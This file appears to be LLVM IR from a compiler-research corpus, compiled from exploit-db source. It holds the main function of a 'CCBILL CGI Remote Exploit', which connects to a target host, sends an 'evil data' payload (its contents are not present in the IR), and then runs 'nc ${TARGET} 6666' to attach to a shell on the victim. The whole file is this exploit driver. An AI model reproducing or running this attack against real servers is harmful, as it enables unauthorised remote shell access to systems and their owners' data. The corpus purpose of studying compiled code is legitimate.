; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/cgi/webapps/extr_53.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/cgi/webapps/extr_53.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }

@.str = private unnamed_addr constant [7 x i8] c"TARGET\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.2 = private unnamed_addr constant [66 x i8] c"[CCBILL CGI Remote Exploit By:Knight420]\0Ausage: %s <host> <port>\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [12 x i8] c"net_connect\00", align 1
@ccbill = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [42 x i8] c"[CCBILL CGI Remote Exploit By:Knight420]\0A\00", align 1
@.str.5 = private unnamed_addr constant [21 x i8] c"[1] evil data sent.\0A\00", align 1
@.str.6 = private unnamed_addr constant [26 x i8] c"[2] connecting to shell.\0A\00", align 1
@.str.7 = private unnamed_addr constant [47 x i8] c"nc ${TARGET} 6666 || echo '[-]Exploit failed!'\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %7, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp ne i32 %11, 3
  br i1 %12, label %13, label %18

13:                                               ; preds = %2
  %14 = call i32 @system(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.2, i64 0, i64 0))
  %16 = load i32, i32* @EXIT_FAILURE, align 4
  %17 = call i32 @exit(i32 %16) #3
  unreachable

18:                                               ; preds = %2
  %19 = load i8*, i8** %7, align 8
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @setenv(i8* %19, i8* %22, i32 1)
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  store i8* %26, i8** %8, align 8
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 2
  %29 = load i8*, i8** %28, align 8
  %30 = call zeroext i16 @atoi(i8* %29)
  store i16 %30, i16* %9, align 2
  %31 = load i8*, i8** %8, align 8
  %32 = load i16, i16* %9, align 2
  %33 = call i32 @net_connect(%struct.sockaddr_in* %10, i8* %31, i16 zeroext %32, i32 35)
  store i32 %33, i32* %6, align 4
  %34 = load i32, i32* %6, align 4
  %35 = icmp sle i32 %34, 0
  br i1 %35, label %36, label %40

36:                                               ; preds = %18
  %37 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  %38 = load i32, i32* @EXIT_FAILURE, align 4
  %39 = call i32 @exit(i32 %38) #3
  unreachable

40:                                               ; preds = %18
  %41 = load i32, i32* %6, align 4
  %42 = load i32, i32* @ccbill, align 4
  %43 = load i32, i32* @ccbill, align 4
  %44 = call i32 @strlen(i32 %43)
  %45 = call i32 @write(i32 %41, i32 %42, i32 %44)
  %46 = call i32 @sleep(i32 1)
  %47 = load i32, i32* %6, align 4
  %48 = call i32 @close(i32 %47)
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.4, i64 0, i64 0))
  %50 = load i8*, i8** %8, align 8
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0), i8* %50)
  %52 = load i8*, i8** %8, align 8
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0), i8* %52)
  %54 = call i32 @system(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.7, i64 0, i64 0))
  %55 = load i32, i32* @EXIT_SUCCESS, align 4
  %56 = call i32 @exit(i32 %55) #3
  unreachable
}

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local zeroext i16 @atoi(i8*) #1

declare dso_local i32 @net_connect(%struct.sockaddr_in*, i8*, i16 zeroext, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @write(i32, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
